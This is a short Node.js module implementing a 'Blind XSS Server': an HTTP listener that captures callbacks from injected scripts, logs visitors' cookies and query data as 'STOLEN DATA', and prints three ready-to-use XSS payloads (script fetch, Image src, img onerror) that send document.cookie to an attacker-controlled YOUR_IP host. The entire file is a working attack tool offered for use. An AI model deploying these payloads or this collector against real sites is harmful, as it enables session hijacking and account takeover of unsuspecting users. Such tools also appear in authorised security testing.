
const http = require('http')
const fs = require('fs')
const url = require('url')
const chalk = require('chalk')

class BlindXSSServer {
  constructor(options = {}) {
    this.port = options.port || 8080
    this.logFile = options.logFile || 'blind_xss_log.txt'
    this.requests = []
  }

  start() {
    const server = http.createServer((req, res) => {
      const parsedUrl = url.parse(req.url, true)
      const timestamp = new Date().toISOString()

      console.log(chalk.red(`\n[!] XSS Triggered at ${timestamp}`))
      console.log(chalk.white(`    Remote: ${req.socket.remoteAddress}`))
      console.log(chalk.white(`    Path: ${parsedUrl.pathname}`))

      if (Object.keys(parsedUrl.query).length > 0) {
        console.log(chalk.yellow(`    Data received:`))
        for (const [key, value] of Object.entries(parsedUrl.query)) {
          console.log(chalk.yellow(`      ${key} = ${value}`))
        }
      }

      if (req.headers['cookie']) {
        console.log(chalk.yellow(`    Cookie: ${req.headers['cookie']}`))
      }

      const logLine = `[${timestamp}] ${req.socket.remoteAddress} ${req.method} ${req.url}\n`
      fs.appendFileSync(this.logFile, logLine)

      if (parsedUrl.query.c || parsedUrl.query.cookie || parsedUrl.query.s) {
        const stolenData = `[${timestamp}] STOLEN DATA: ${JSON.stringify(parsedUrl.query)}\n`
        fs.appendFileSync(this.logFile, stolenData)
      }

      res.writeHead(200, { 'Content-Type': 'text/plain' })
      res.end('OK')
    })

    console.log(chalk.cyan('\n╔══════════════════════════════════════════╗'))
    console.log(chalk.cyan('║      Blind XSS Server v1.0             ║'))
    console.log(chalk.cyan('╚══════════════════════════════════════════╝'))
    console.log(chalk.white(`[*] Server listening on :${this.port}`))
    console.log(chalk.white(`[*] Log file: ${this.logFile}\n`))
    console.log(chalk.green('[!] Inject these payloads into target:'))
    console.log(chalk.gray(`    <script>fetch('http://YOUR_IP:${this.port}/?c='+document.cookie)</script>`))
    console.log(chalk.gray(`    <script>new Image().src='http://YOUR_IP:${this.port}/?c='+document.cookie</script>`))
    console.log(chalk.gray(`    <img src=x onerror="this.src='http://YOUR_IP:${this.port}/?c='+document.cookie">`))
    console.log()

    server.listen(this.port, () => {
      console.log(chalk.green(`[*] Server started on port ${this.port}. Waiting for callbacks...`))
      console.log(chalk.yellow('[!] Press Ctrl+C to stop\n'))
    })

    return server
  }
}

module.exports = BlindXSSServer
